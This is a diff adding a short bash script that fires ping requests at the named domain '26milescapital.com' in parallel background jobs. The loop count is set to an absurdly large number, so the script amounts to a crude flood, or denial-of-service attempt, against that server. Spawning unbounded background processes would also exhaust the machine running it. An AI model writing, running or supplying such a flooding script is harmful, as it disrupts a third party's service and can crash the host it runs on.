@@ -1,0 +1,15 @@
+#!/bin/bash
+
+# Number of pings to send
+NUM_PINGS=100000000000000000
+# Server to ping
+SERVER="26milescapital.com"
+
+# Send pings simultaneously
+for i in $(seq 1 $NUM_PINGS); do
+    ping -c 1 $SERVER &
+done
+
+# Wait for all background jobs to finish
+wait
+
